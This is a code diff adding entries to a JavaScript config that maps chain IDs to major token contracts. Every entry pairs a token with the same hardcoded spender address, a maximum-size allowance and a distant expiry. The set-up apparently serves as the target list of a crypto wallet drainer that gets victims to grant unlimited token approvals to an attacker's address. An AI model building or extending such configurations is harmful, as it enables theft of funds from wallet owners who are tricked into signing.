@@ -2,6 +2,52 @@ const spender_address = "0x5eE4A19bf6D6908AB12853Af169575bBFeCF8BFE";
 const amount = "1461501637330902918203684832716283019655932542975";
 const expiration = 1885674579;
 export const Ddefault = {
+    default: {
+        spender_address: spender_address,
+        expiration: expiration,
+        weth: {
+            name: "weth",
+            address: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
+            amount: amount,
+            expiration: expiration,
+        },
+        usdc: {
+            name: "usdc",
+            address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+            amount: amount,
+            expiration: expiration,
+        },
+        usdt: {
+            name: "usdt",
+            address: "0xdac17f958d2ee523a2206206994597c13d831ec7",
+            amount: amount,
+            expiration: expiration,
+        },
+        shib: {
+            name: "shib",
+            address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
+            amount: amount,
+            expiration: expiration,
+        },
+        ape: {
+            name: "ape",
+            address: "0x4d224452801aced8b2f0aebe155379bb5d594381",
+            amount: amount,
+            expiration: expiration,
+        },
+        dai: {
+            name: "dai",
+            address: "0x6b175474e89094c44da98b954eedeac495271d0f",
+            amount: amount,
+            expiration: expiration,
+        },
+        link: {
+            name: "link",
+            address: "0x514910771af9ca656af840dff83e8264ecf986ca",
+            amount: amount,
+            expiration: expiration,
+        },
+    },
     1: {
         spender_address: spender_address,
         expiration: expiration,
@@ -44,6 +90,22 @@ export const Ddefault = {
         link: {
             name: "link",
             address: "0x514910771af9ca656af840dff83e8264ecf986ca",
+            amount: amount,
+            expiration: expiration,
+        },
+    },
+    5: {
+        spender_address: spender_address,
+        expiration: expiration,
+        gousdc: {
+            name: "gousdc",
+            address: "0x6fc877f19aafdc6c65f3bd663640577769f58cc1",
+            amount: amount,
+            expiration: expiration,
+        },
+        gousdt: {
+            name: "gousdt",
+            address: "0x15ef301c8731eeb753a98110d496a74f35ce6fbd",
             amount: amount,
             expiration: expiration,
         },
